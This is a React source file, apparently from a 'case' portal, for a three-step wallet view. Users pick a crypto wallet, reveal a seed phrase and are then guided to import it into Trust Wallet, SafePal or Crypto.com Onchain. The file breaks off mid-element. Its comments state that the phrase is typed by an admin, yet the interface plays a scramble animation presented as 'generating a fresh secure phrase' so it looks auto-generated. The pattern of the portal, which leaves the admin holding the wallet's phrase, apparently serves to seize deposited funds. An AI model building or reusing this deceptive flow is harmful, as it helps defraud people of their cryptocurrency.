import { useEffect, useMemo, useState } from "react";
import { motion, useReducedMotion } from "framer-motion";
import { Trans, useTranslation } from "react-i18next";
import { usePortal } from "./PortalContext";
import { getIsWithdrawalMode } from "@/lib/withdrawalMode";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { useToast } from "@/hooks/use-toast";
import { getPortalToken } from "@/lib/portalSession";
import { phraseWordsFromCode } from "@/lib/phraseKeyWords";
import {
  KeyRound, Wallet, Shield, Copy, Check, CheckCircle, Eye, EyeOff,
  Download, ArrowRight, AlertTriangle, Sparkles, RefreshCw,
  Apple, Play, ShieldCheck, X, ListChecks, Lock,
} from "lucide-react";

// Task #332 — Wallet Connect Phrase Code
// ---------------------------------------------------------------------------
// Three-step flow visible only when the admin has enabled the feature for
// this case (`walletPhraseEnabled`). Step 1 lets the user pick a wallet
// (or type a custom name) and POSTs it to /wallet-exchange. Step 2 lazily
// fetches the admin-typed phrase via /wallet-phrase and renders it in a
// monospace word-grid that mimics auto-generated output. Step 3 surfaces
// a wallet-specific download + import guide so the user knows what to do
// with the phrase outside the portal.

interface WalletOption {
  id: string;
  name: string;
  // Generic website landing page — used as a safe fallback when a
  // platform-specific store link is missing or the visitor is on desktop.
  download: string;
  // Direct device-aware store listings. Verified against the live App Store /
  // Google Play listings during Task #776.
  appStore: string;
  playStore: string;
  // Older case rows may have persisted a previous display name for the same
  // wallet (e.g. "Crypto.com DeFi Wallet" before the Onchain rename). Match
  // them back to this option so the picker still locks to the preset.
  aliases?: string[];
}

const WALLET_OPTIONS: WalletOption[] = [
  {
    id: "cryptocom",
    name: "Crypto.com Onchain",
    download: "https://crypto.com/defi-wallet",
    appStore: "https://apps.apple.com/us/app/crypto-com-onchain-wallet/id1512048310",
    playStore: "https://play.google.com/store/apps/details?id=com.defi.wallet",
    aliases: [
      "Crypto.com DeFi Wallet",
      "Crypto.com Wallet",
      "Crypto.com Onchain Wallet",
      "Crypto.com",
    ],
  },
  {
    id: "trust",
    name: "Trust Wallet",
    download: "https://trustwallet.com/download",
    appStore: "https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409",
    playStore: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
  },
  {
    id: "safepal",
    name: "SafePal Wallet",
    download: "https://www.safepal.com/en/download",
    appStore: "https://apps.apple.com/app/safepal-wallet/id1548297139",
    playStore: "https://play.google.com/store/apps/details?id=io.safepal.wallet",
  },
];

function findOptionByName(name: string | null | undefined): WalletOption | undefined {
  if (!name) return undefined;
  const lower = name.toLowerCase();
  return WALLET_OPTIONS.find(
    (w) =>
      w.name.toLowerCase() === lower ||
      (w.aliases ?? []).some((a) => a.toLowerCase() === lower),
  );
}

// Best-effort device detection from the user agent. iOS / Android are the
// two stores we highlight; everything else (desktop, unknown) shows both
// buttons equally. Kept tiny and dependency-free.
type DevicePlatform = "ios" | "android" | "other";

function detectPlatform(ua?: string): DevicePlatform {
  const agent = (ua ?? "").toLowerCase();
  if (!agent) return "other";
  // iPadOS 13+ reports as "Macintosh" but exposes touch; keep it simple and
  // treat classic iOS UA tokens as iOS. Desktop Safari falls through to other.
  if (/iphone|ipad|ipod/.test(agent)) return "ios";
  if (/android/.test(agent)) return "android";
  return "other";
}

// Small pool of plausible-looking words used purely for the "generating a
// fresh secure phrase" reveal animation. These are NEVER persisted or sent
// anywhere — they are decorative scramble frames that settle into the real
// admin-entered phrase. (BIP39-flavoured but intentionally generic.)
const SCRAMBLE_WORDS = [
  "ocean", "ladder", "velvet", "ember", "harbor", "cobalt", "meadow", "quartz",
  "summit", "ripple", "cipher", "tundra", "lantern", "nectar", "pivot", "anchor",
  "willow", "garnet", "saffron", "zephyr", "marble", "thunder", "orchid", "falcon",
];

function scrambleWord(seed: number): string {
  return SCRAMBLE_WORDS[Math.abs(seed) % SCRAMBLE_WORDS.length];
}

// Guards for i18next `returnObjects` reads — a malformed (e.g. partially
// translated) locale could return a non-array/non-string shape, which would
// crash `.map()`. These coerce to a safe empty list instead.
function asStringArray(v: unknown): string[] {
  return Array.isArray(v) ? v.filter((x): x is string => typeof x === "string") : [];
}

export function WalletConnectView() {
  const { currentCase, setViewState } = usePortal();
  const { toast } = useToast();
  const { t } = useTranslation('portal');
  const prefersReducedMotion = useReducedMotion();

  // Device-aware store highlighting. Detected once from the user agent so the
  // App Store / Play Store buttons can promote the matching platform.
  const platform = useMemo<DevicePlatform>(
    () =>
      detectPlatform(
        typeof navigator !== "undefined" ? navigator.userAgent : undefined,
      ),
    [],
  );

  // Hydrate the picker from whatever the admin sees on the case. If the
  // persisted name matches one of the three presets we lock the picker to
  // that preset, otherwise we treat it as a custom entry.
  const initialOption = findOptionByName(currentCase?.walletExchangeName);
  const [selectedId, setSelectedId] = useState<string | null>(
    initialOption ? initialOption.id : (currentCase?.walletExchangeName ? "custom" : null)
  );
  const [customName, setCustomName] = useState<string>(
    initialOption ? "" : (currentCase?.walletExchangeName ?? "")
  );
  const [savingWallet, setSavingWallet] = useState(false);

  const [step, setStep] = useState<1 | 2 | 3>(
    currentCase?.walletExchangeName ? 2 : 1
  );

  const [phraseCode, setPhraseCode] = useState<string | null>(null);
  const [phraseLoading, setPhraseLoading] = useState(false);
  const [phraseError, setPhraseError] = useState<string | null>(null);
  const [revealed, setRevealed] = useState(false);
  const [copied, setCopied] = useState(false);

  // Generation-style reveal (Task #776). Purely presentational: the phrase
  // data is the exact admin-entered value fetched lazily below — these states
  // only drive a short "generating a fresh secure phrase" animation that
  // settles into the real words. Honors prefers-reduced-motion by never
  // starting (the phrase is shown instantly).
  const [generating, setGenerating] = useState(false);
  const [lockedCount, setLockedCount] = useState(0);
  const [scrambleTick, setScrambleTick] = useState(0);

  const selectedOption: WalletOption | null = useMemo(() => {
    if (!selectedId) return null;
    if (selectedId === "custom") return null;
    return WALLET_OPTIONS.find((w) => w.id === selectedId) ?? null;
  }, [selectedId]);

  const effectiveWalletName = useMemo(() => {
    if (selectedOption) return selectedOption.name;
    if (selectedId === "custom") return customName.trim();
    return "";
  }, [selectedOption, selectedId, customName]);

  // Lazy-fetch the phrase on demand. Triggered when the user clicks Reveal
  // for the first time on step 2. We don't preload it on mount so curious
  // visitors with stolen access codes never get the phrase pre-fetched.
  const fetchPhrase = async () => {
    if (!currentCase) return;
    setPhraseLoading(true);
    setPhraseError(null);
    try {
      const token = getPortalToken();
      const res = await fetch(`/api/cases/${currentCase.id}/wallet-phrase`, {
        headers: token ? { 'x-portal-session-token': token } : undefined,
      });
      if (!res.ok) {
        setPhraseError(
          res.status === 404
            ? t('walletConnect.step2.errorNotReady')
            : t('walletConnect.step2.errorHttp', { status: res.status })
        );
        return;
      }
      const data = await res.json();
      const code = (data?.phraseCode ?? '').toString().trim();
      if (!code) {
        setPhraseError(t('walletConnect.step2.errorNotReadyShort'));
        return;
      }
      setPhraseCode(code);
      setRevealed(true);
      // Kick off the generation-style reveal unless the user prefers reduced
      // motion (in which case the real words show instantly). The data is
      // identical either way — only the presentation differs.
      if (!prefersReducedMotion) {
        setLockedCount(0);
        setScrambleTick(0);
        setGenerating(true);
      }
    } catch {
      setPhraseError(t('walletConnect.step2.errorNetwork'));
    } finally {
      setPhraseLoading(false);
    }
  };

  // Drive the generation-style reveal: scramble frames tick quickly while
  // words "settle" one-by-one until every slot shows its real value. The
  // phrase data is never mutated — only which words are shown as scrambled.
  useEffect(() => {
    if (!generating) return;
    const total = phraseWords.length;
    if (total === 0) {
      setGenerating(false);
      return;
    }
    const scrambleTimer = setInterval(() => {
      setScrambleTick((tk) => tk + 1);
    }, 70);
    let locked = 0;
    const lockTimer = setInterval(() => {
      locked += 1;
      setLockedCount(locked);
      if (locked >= total) {
        clearInterval(lockTimer);
        clearInterval(scrambleTimer);
        setGenerating(false);
      }
    }, 170);
    return () => {
      clearInterval(scrambleTimer);
      clearInterval(lockTimer);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [generating]);

  // Reset the "Copied!" tag after a couple of seconds.
  useEffect(() => {
    if (!copied) return;
    const tt = setTimeout(() => setCopied(false), 1800);
    return () => clearTimeout(tt);
  }, [copied]);

  const saveWalletSelection = async () => {
    if (!currentCase) return;
    const name = effectiveWalletName.trim();
    if (!name) {
      toast({
        variant: 'destructive',
        title: t('walletConnect.step1.pickWalletTitle'),
        description: t('walletConnect.step1.pickWalletDesc'),
      });
      return;
    }
    setSavingWallet(true);
    try {
      const token = getPortalToken();
      const res = await fetch(`/api/cases/${currentCase.id}/wallet-exchange`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(token ? { 'x-portal-session-token': token } : {}),
        },
        body: JSON.stringify({ walletExchangeName: name }),
      });
      if (!res.ok) {
        toast({
          variant: 'destructive',
          title: t('walletConnect.step1.saveErrorTitle'),
          description: t('walletConnect.step1.saveErrorDesc', { status: res.status }),
        });
        return;
      }
      toast({
        title: t('walletConnect.step1.savedTitle'),
        description: t('walletConnect.step1.savedDesc', { name }),
      });
      setStep(2);
    } catch {
      toast({
        variant: 'destructive',
        title: t('walletConnect.step1.networkErrorTitle'),
        description: t('walletConnect.step1.networkErrorDesc'),
      });
    } finally {
      setSavingWallet(false);
    }
  };

  const copyPhrase = async () => {
    if (!phraseCode) return;
    try {
      await navigator.clipboard.writeText(phraseCode);
      setCopied(true);
      toast({ title: t('walletConnect.step2.copied') });
    } catch {
      toast({
        variant: 'destructive',
        title: t('walletConnect.step2.copyFailedTitle'),
        description: t('walletConnect.step2.copyFailedDesc'),
      });
    }
  };

  const phraseWords = useMemo(
    () => phraseWordsFromCode(phraseCode ?? ''),
    [phraseCode]
  );

  // Defensive guard — the nav item only renders when enabled, but a deep
  // link could land here while the toggle is off.
  if (!currentCase) return null;
  const isWithdrawalMode = getIsWithdrawalMode(currentCase);
  if (isWithdrawalMode && !currentCase.walletPhraseEnabled) {
    return (
      <div className="max-w-2xl mx-auto py-12 px-4">
        <div
          className="rounded-2xl p-6 flex items-start gap-4"
          style={{
            background: "linear-gradient(135deg, rgba(16,185,129,0.15), rgba(34,197,94,0.08))",
            border: "1px solid rgba(74,222,128,0.35)",
          }}
          data-testid="wallet-connect-withdrawal-done"
        >
          <div className="w-12 h-12 rounded-xl bg-emerald-500/20 border border-emerald-400/30 flex items-center justify-center shrink-0">
            <CheckCircle className="w-6 h-6 text-emerald-300" />
          </div>
          <div>
            <p className="text-[10px] uppercase tracking-widest font-semibold text-emerald-300 mb-0.5">
              {t("walletConnect.withdrawalDone.kicker")}
            </p>
            <h3 className="text-white font-bold text-base">
              {t("walletConnect.withdrawalDone.title")}
            </h3>
            <p className="text-emerald-100/75 text-sm mt-1">
              {t("walletConnect.withdrawalDone.body")}
            </p>
          </div>
        </div>
      </div>
    );
  }
  if (!currentCase.walletPhraseEnabled) {
    return (
      <div className="max-w-2xl mx-auto py-12 px-4">
        <Card className="border-amber-200/50 bg-amber-50/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-amber-200">
              <AlertTriangle className="h-5 w-5" />
              {t('walletConnect.unavailable.title')}
            </CardTitle>
            <CardDescription>
              {t('walletConnect.unavailable.description')}
            </CardDescription>
          </CardHeader>
          <CardContent>
            <Button onClick={() => setViewState('dashboard')} variant="outline">
              {t('walletConnect.unavailable.back')}
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  const displayWalletName =
    currentCase.walletExchangeName ?? effectiveWalletName ?? t('walletConnect.yourWallet');
  const step3WalletName =
    currentCase.walletExchangeName ?? selectedOption?.name ?? t('walletConnect.yourWallet');

  const rawImportSteps = selectedOption
    ? t(`walletConnect.wallets.${selectedOption.id}.importSteps`, {
        returnObjects: true,
      })
    : null;
  const rawGenericSteps = t('walletConnect.genericSteps', { returnObjects: true });
  const genericSteps: string[] = Array.isArray(rawGenericSteps)
    ? (rawGenericSteps as string[])
    : [];
  const importSteps: string[] = Array.isArray(rawImportSteps)
    ? (rawImportSteps as string[])
    : genericSteps;

  return (
    <main id="main-content" tabIndex={-1} className="relative isolate overflow-hidden max-w-4xl mx-auto py-8 px-4 space-y-6">
      {/* Ambient drifting orbs — decorative depth layer */}
      <div aria-hidden className="pointer-events-none absolute inset-0 -z-10 overflow-hidden">
        <motion.div
          className="absolute -top-24 -left-20 h-72 w-72 rounded-full bg-purple-600/20 blur-3xl"
          animate={prefersReducedMotion ? undefined : { x: [0, 30, 0], y: [0, 24, 0] }}
          transition={{ duration: 18, repeat: Infinity, ease: 'easeInOut' }}
        />
        <motion.div
          className="absolute top-1/3 -right-24 h-80 w-80 rounded-full bg-fuchsia-500/15 blur-3xl"
          animate={prefersReducedMotion ? undefined : { x: [0, -26, 0], y: [0, 32, 0] }}
          transition={{ duration: 22, repeat: Infinity, ease: 'easeInOut' }}
        />
        <motion.div
          className="absolute bottom-0 left-1/3 h-64 w-64 rounded-full bg-indigo-600/15 blur-3xl"
          animate={prefersReducedMotion ? undefined : { x: [0, 22, 0], y: [0, -20, 0] }}
          transition={{ duration: 20, repeat: Infinity, ease: 'easeInOut' }}
        />
      </div>

      <motion.div
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.25 }}
        className="flex items-start gap-4"
      >
        <div className="relative shrink-0">
          <div aria-hidden className="absolute inset-0 rounded-2xl bg-purple-500/40 blur-xl" />
          <div className="relative h-12 w-12 md:h-14 md:w-14 rounded-2xl bg-gradient-to-br from-purple-500 to-fuchsia-600 flex items-center justify-center shadow-lg shadow-purple-900/50 ring-1 ring-white/15">
            <KeyRound className="h-6 w-6 md:h-7 md:w-7 text-white" />
          </div>
        </div>
        <div className="space-y-2">
          <Badge variant="outline" className="border-purple-500/40 text-purple-200 bg-purple-950/40 backdrop-blur-sm">
            <Sparkles className="h-3 w-3 mr-1" />
            {t('walletConnect.badge')}
          </Badge>
          <h1 className="text-2xl md:text-3xl font-bold tracking-tight bg-gradient-to-r from-white via-purple-100 to-purple-300 bg-clip-text text-transparent">
            {t('walletConnect.title')}
          </h1>
          <p className="text-sm text-slate-400">
            {t('walletConnect.subtitle')}
          </p>
        </div>
      </motion.div>

      {/* Step indicator */}
      <div className="flex items-center gap-2 text-xs">
        {[1, 2, 3].map((n) => (
          <div key={n} className="flex items-center gap-2">
            <div
              className={`h-8 w-8 rounded-full flex items-center justify-center font-semibold border transition-all duration-300 ${
                step === n
                  ? 'bg-gradient-to-br from-purple-500 to-fuchsia-600 border-purple-300 text-white shadow-lg shadow-purple-900/50 ring-2 ring-purple-500/30'
                  : step > n
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300'
                  : 'bg-slate-800/50 border-slate-700 text-slate-500'
              }`}
              data-testid={`step-indicator-${n}`}
            >
              {step > n ? <Check className="h-4 w-4" /> : n}
            </div>
            {n < 3 && (
              <div
                className={`h-0.5 w-8 md:w-12 rounded-full transition-colors duration-300 ${
                  step > n ? 'bg-emerald-500/60' : 'bg-slate-700'
                }`}
              />
            )}
          </div>
        ))}
      </div>

      {/* Step 1 — Wallet picker */}
      {step === 1 && (
        <Card className="border-white/10 bg-slate-900/50 backdrop-blur-xl shadow-2xl shadow-purple-950/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Wallet className="h-5 w-5 text-purple-400" />
              {t('walletConnect.step1.title')}
            </CardTitle>
            <CardDescription>
              {t('walletConnect.step1.description')}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              {WALLET_OPTIONS.map((w) => {
                const active = selectedId === w.id;
                return (
                  <button
                    key={w.id}
                    type="button"
                    onClick={() => setSelectedId(w.id)}
                    className={`text-left rounded-xl border p-4 transition-all duration-200 ${
                      active
                        ? 'border-purple-400 bg-purple-950/50 ring-2 ring-purple-500/40 shadow-lg shadow-purple-900/40'
                        : 'border-slate-700/70 bg-slate-800/40 hover:border-purple-500/40 hover:bg-slate-800/70 hover:-translate-y-0.5'
                    }`}
                    data-testid={`wallet-option-${w.id}`}
                  >
                    <div className="flex items-center gap-2 mb-2">
                      <Wallet className={`h-4 w-4 ${active ? 'text-purple-300' : 'text-slate-400'}`} />
                      <div className="font-semibold text-white text-sm">{w.name}</div>
                    </div>
                    <div className="text-[11px] text-slate-400">
                      {t(`walletConnect.wallets.${w.id}.tagline`)}
                    </div>
                  </button>
                );
              })}
            </div>

            <Separator className="bg-slate-800" />

            <div className="space-y-2">
              <button
                type="button"
                onClick={() => setSelectedId("custom")}
                className={`w-full text-left rounded-xl border p-4 transition-all duration-200 ${
                  selectedId === "custom"
                    ? 'border-purple-400 bg-purple-950/50 ring-2 ring-purple-500/40 shadow-lg shadow-purple-900/40'
                    : 'border-slate-700/70 bg-slate-800/40 hover:border-purple-500/40 hover:bg-slate-800/70 hover:-translate-y-0.5'
                }`}
                data-testid="wallet-option-custom"
              >
                <div className="font-semibold text-white text-sm mb-1">
                  {t('walletConnect.step1.customTitle')}
                </div>
                <div className="text-[11px] text-slate-400">
                  {t('walletConnect.step1.customDescription')}
                </div>
              </button>
              {selectedId === "custom" && (
                <div className="space-y-1.5">
                  <Label className="text-xs text-slate-400">
                    {t('walletConnect.step1.customLabel')}
                  </Label>
                  <Input
                    value={customName}
                    onChange={(e) => setCustomName(e.target.value)}
                    placeholder={t('walletConnect.step1.customPlaceholder')}
                    className="bg-slate-800/50 border-slate-700 text-white"
                    maxLength={120}
                    data-testid="input-custom-wallet-name"
                  />
                </div>
              )}
            </div>

            <div className="flex justify-end">
              <Button
                onClick={saveWalletSelection}
                disabled={savingWallet || !effectiveWalletName.trim()}
                className="bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-500 hover:to-fuchsia-500 text-white shadow-lg shadow-purple-900/40"
                data-testid="button-wallet-continue"
              >
                {savingWallet ? t('walletConnect.step1.saving') : (
                  <>
                    {t('walletConnect.step1.continue')}
                    <ArrowRight className="h-4 w-4 ml-1" />
                  </>
                )}
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Step 2 — Reveal phrase */}
      {step === 2 && (
        <Card className="border-white/10 bg-slate-900/50 backdrop-blur-xl shadow-2xl shadow-purple-950/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <KeyRound className="h-5 w-5 text-purple-400" />
              {t('walletConnect.step2.title')}
            </CardTitle>
            <CardDescription>
              <Trans
                i18nKey="walletConnect.step2.description"
                ns="portal"
                values={{ wallet: displayWalletName }}
                components={{ 0: <span className="font-semibold text-purple-300" /> }}
              />
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="rounded-lg border border-amber-500/30 bg-amber-950/20 p-3 text-xs text-amber-200 flex items-start gap-2">
              <Shield className="h-4 w-4 mt-0.5 shrink-0" />
              <div>
                <strong>{t('walletConnect.step2.securityReminderLabel')}</strong>{' '}
                {t('walletConnect.step2.securityReminderBody')}
              </div>
            </div>

            {!phraseCode && !phraseLoading && !phraseError && (
              <div className="flex flex-col items-center justify-center py-8 space-y-3">
                <div className="relative">
                  <div aria-hidden className="absolute inset-0 rounded-full bg-purple-500/30 blur-xl" />
                  <div className="relative rounded-full bg-gradient-to-br from-purple-900/60 to-purple-950/60 border border-purple-600/60 p-4 ring-1 ring-white/5">
                    <EyeOff className="h-6 w-6 text-purple-300" />
                  </div>
                </div>
                <div className="text-sm text-slate-300 text-center max-w-md">
                  {t('walletConnect.step2.hiddenBody')}
                </div>
                <Button
                  onClick={fetchPhrase}
                  className="bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-500 hover:to-fuchsia-500 text-white shadow-lg shadow-purple-900/40"
                  data-testid="button-reveal-phrase"
                >
                  <Eye className="h-4 w-4 mr-1" />
                  {t('walletConnect.step2.reveal')}
                </Button>
              </div>
            )}

            {phraseLoading && (
              <div className="flex items-center justify-center py-8 text-sm text-slate-400">
                <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                {t('walletConnect.step2.loading')}
              </div>
            )}

            {phraseError && (
              <div className="rounded-lg border border-red-500/40 bg-red-950/20 p-4 space-y-3">
                <div className="flex items-start gap-2 text-sm text-red-200">
                  <AlertTriangle className="h-4 w-4 mt-0.5 shrink-0" />
                  <div>{phraseError}</div>
                </div>
                <Button size="sm" variant="outline" onClick={fetchPhrase} data-testid="button-retry-phrase">
                  {t('walletConnect.step2.retry')}
                </Button>
              </div>
            )}

            {phraseCode && (
              <div className="space-y-3">
                {generating && (
                  <div
                    className="flex items-center justify-center gap-2 text-sm text-purple-200"
                    data-testid="phrase-generating"
                    aria-live="polite"
                  >
                    <Sparkles className="h-4 w-4 animate-pulse text-purple-300" />
                    {t('walletConnect.step2.generating')}
                  </div>
                )}
                <div
                  className={`relative rounded-xl border border-purple-500/40 bg-gradient-to-b from-slate-900/80 to-slate-950/90 p-4 ring-1 ring-inset ring-purple-500/10 shadow-lg shadow-purple-950/40 ${
                    revealed ? '' : 'blur-md select-none'
                  }`}
                  data-testid="phrase-grid"
                >
                  <div className="grid grid-cols-3 md:grid-cols-4 gap-2">
                    {phraseWords.map((w, idx) => {
                      const settled = !generating || idx < lockedCount;
                      const shown = settled
                        ? w
                        : scrambleWord(scrambleTick + idx * 7);
                      return (
                        <div
                          key={`${idx}-${w}`}
                          className={`flex items-baseline gap-2 rounded-lg border px-3 py-2 transition-all duration-200 ${
                            settled
                              ? 'bg-slate-900/70 border-slate-700/80 hover:border-purple-500/40'
                              : 'bg-purple-950/40 border-purple-600/50 shadow-sm shadow-purple-900/30'
                          }`}
                          data-testid={`phrase-word-${idx}`}
                        >
                          <span className="text-[10px] text-slate-500 font-mono w-5 text-right">
                            {idx + 1}.
                          </span>
                          <span
                            className={`font-mono text-sm tracking-wide ${
                              settled ? 'text-white' : 'text-purple-300/80'
                            }`}
                          >
                            {shown}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                </div>

                {/* Save-it-safely checklist */}
                <div className="rounded-lg border border-emerald-500/30 bg-emerald-950/15 p-3 space-y-2">
                  <div className="flex items-center gap-2 text-xs font-semibold text-emerald-200">
                    <ListChecks className="h-4 w-4" />
                    {t('walletConnect.step2.saveTitle')}
                  </div>
                  <ul className="space-y-1.5 text-[11px] text-emerald-100/90">
                    {asStringArray(t('walletConnect.step2.saveTips', {
                      returnObjects: true,
                    })).map((tip, i) => (
                      <li key={i} className="flex items-start gap-2">
                        <Check className="h-3.5 w-3.5 mt-0.5 shrink-0 text-emerald-400" />
                        <span>{tip}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="flex flex-wrap items-center gap-2">
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => setRevealed((v) => !v)}
                    data-testid="button-toggle-reveal"
                  >
                    {revealed ? (
                      <>
                        <EyeOff className="h-3.5 w-3.5 mr-1" />
                        {t('walletConnect.step2.hide')}
                      </>
                    ) : (
                      <>
                        <Eye className="h-3.5 w-3.5 mr-1" />
                        {t('walletConnect.step2.show')}
                      </>
                    )}
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={copyPhrase}
                    data-testid="button-copy-phrase"
                  >
                    {copied ? (
                      <>
                        <Check className="h-3.5 w-3.5 mr-1 text-emerald-400" />
                        {t('walletConnect.step2.copied')}
                      </>
                    ) : (
                      <>
                        <Copy className="h-3.5 w-3.5 mr-1" />
                        {t('walletConnect.step2.copy')}
                      </>
                    )}
                  </Button>
                  <div className="ml-auto">
                    <Button
                      size="sm"
                      onClick={() => setStep(3)}
                      className="bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-500 hover:to-fuchsia-500 text-white shadow-lg shadow-purple-900/40"
                      data-testid="button-next-import-guide"
                    >
                      {t('walletConnect.step2.next')}
                      <ArrowRight className="h-4 w-4 ml-1" />
                    </Button>
                  </div>
                </div>
              </div>
            )}

            <div className="pt-2">
              <Button
                variant="ghost"
                size="sm"
                className="text-slate-500 hover:text-white"
                onClick={() => setStep(1)}
                data-testid="button-back-to-picker"
              >
                {t('walletConnect.step2.changeWallet')}
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Step 3 — Import guide */}
      {step === 3 && (
        <Card className="border-white/10 bg-slate-900/50 backdrop-blur-xl shadow-2xl shadow-purple-950/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Download className="h-5 w-5 text-purple-400" />
              {t('walletConnect.step3.title', { wallet: step3WalletName })}
            </CardTitle>
            <CardDescription>
              {t('walletConnect.step3.description')}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {selectedOption ? (
              <>
                <div className="space-y-2">
                  <div className="flex flex-wrap items-center gap-2">
                    <a
                      href={selectedOption.appStore || selectedOption.download}
                      target="_blank"
                      rel="noreferrer noopener"
                      className={`inline-flex items-center gap-2 rounded-md px-3 py-2 text-sm font-medium transition-colors ${
                        platform === 'ios'
                          ? 'bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-500 hover:to-fuchsia-500 text-white ring-2 ring-purple-400/50 shadow-lg shadow-purple-900/40'
                          : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border border-slate-700'
                      }`}
                      data-testid="link-appstore"
                    >
                      <Apple className="h-4 w-4" />
                      {t('walletConnect.step3.appStore')}
                      {platform === 'ios' && (
                        <Badge
                          variant="outline"
                          className="ml-1 border-purple-300/60 text-purple-100 text-[10px]"
                          data-testid="badge-store-recommended-ios"
                        >
                          {t('walletConnect.step3.recommended')}
                        </Badge>
                      )}
                    </a>
                    <a
                      href={selectedOption.playStore || selectedOption.download}
                      target="_blank"
                      rel="noreferrer noopener"
                      className={`inline-flex items-center gap-2 rounded-md px-3 py-2 text-sm font-medium transition-colors ${
                        platform === 'android'
                          ? 'bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-500 hover:to-fuchsia-500 text-white ring-2 ring-purple-400/50 shadow-lg shadow-purple-900/40'
                          : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border border-slate-700'
                      }`}
                      data-testid="link-playstore"
                    >
                      <Play className="h-4 w-4" />
                      {t('walletConnect.step3.playStore')}
                      {platform === 'android' && (
                        <Badge
                          variant="outline"
                          className="ml-1 border-purple-300/60 text-purple-100 text-[10px]"
                          data-testid="badge-store-recommended-android"
                        >
                          {t('walletConnect.step3.recommended')}
                        </Badge>
                      )}
                    </a>
                  </div>
                  <div className="flex flex-wrap items-center gap-2">
                    <a
                      href={selectedOption.download}
                      target="_blank"
                      rel="noreferrer noopener"
                      className="inline-flex items-center gap-1.5 text-xs text-slate-400 hover:text-slate-200 underline underline-offset-2"
                      data-testid="link-wallet-download"
                    >
                      <Download className="h-3.5 w-3.5" />
                      {t('walletConnect.step3.download', { wallet: selectedOption.name })}
                    </a>
                    <Badge variant="outline" className="border-slate-700 text-slate-400">
                      {t('walletConnect.step3.officialLink')}
                    </Badge>
                  </div>
                </div>
                <ol className="space-y-2 text-sm text-slate-300">
                  {importSteps.map((s, i) => (
                    <li key={i} className="flex gap-3" data-testid={`import-step-${i}`}>
                      <span className="shrink-0 h-6 w-6 rounded-full bg-purple-900/40 border border-purple-700 text-purple-200 text-xs font-semibold inline-flex items-center justify-center">
                        {i + 1}
                      </span>
                      <span className="pt-0.5">{s}</span>
                    </li>
                  ))}
                </ol>
              </>
            ) : (
              <>
                <div className="rounded-lg border border-slate-700 bg-slate-800/40 p-3 text-sm text-slate-300">
                  <Trans
                    i18nKey="walletConnect.step3.customNotice"
                    ns="portal"
                    values={{ name: currentCase.walletExchangeName ?? effectiveWalletName }}
                    components={{ 0: <span className="font-semibold text-white" /> }}
                  />
                </div>
                <ol className="space-y-2 text-sm text-slate-300">
                  {genericSteps.map((s, i) => (
                    <li key={i} className="flex gap-3" data-testid={`import-step-${i}`}>
                      <span className="shrink-0 h-6 w-6 rounded-full bg-purple-900/40 border border-purple-700 text-purple-200 text-xs font-semibold inline-flex items-center justify-center">
                        {i + 1}
                      </span>
                      <span className="pt-0.5">{s}</span>
                    </li>
                  ))}
                </ol>
              </>
            )}

            <Separator className="bg-slate-800" />

            {/* Do's & don'ts */}
            <div className="grid gap-3 sm:grid-cols-2">
              <div className="rounded-lg border border-emerald-500/30 bg-emerald-950/15 p-3">
                <div className="flex items-center gap-2 text-xs font-semibold text-emerald-200 mb-2">
                  <ShieldCheck className="h-4 w-4" />
                  {t('walletConnect.step3.dosTitle')}
                </div>
                <ul className="space-y-1.5 text-[11px] text-emerald-100/90">
                  {asStringArray(t('walletConnect.step3.dos', {
                    returnObjects: true,
                  })).map((item, i) => (
                    <li key={i} className="flex items-start gap-2">
                      <Check className="h-3.5 w-3.5 mt-0.5 shrink-0 text-emerald-400" />
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
              <div className="rounded-lg border border-rose-500/30 bg-rose-950/15 p-3">
                <div className="flex items-center gap-2 text-xs font-semibold text-rose-200 mb-2">
                  <Lock className="h-4 w-4" />
                  {t('walletConnect.step3.dontsTitle')}
                </div>
                <ul className="space-y-1.5 text-[11px] text-rose-100/90">
                  {asStringArray(t('walletConnect.step3.donts', {
                    returnObjects: true,
                  })).map((item, i) => (
                    <li key={i} className="flex items-start gap-2">
                      <X className="h-3.5 w-3.5 mt-0.5 shrink-0 text-rose-400" />
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>

            <div className="rounded-lg border border-emerald-500/30 bg-emerald-950/20 p-3 text-xs text-emerald-200 flex items-start gap-2">
              <Check className="h-4 w-4 mt-0.5 shrink-0" />
              <div>{t('walletConnect.step3.completion')}</div>
            </div>

            <div className="flex justify-between">
              <Button
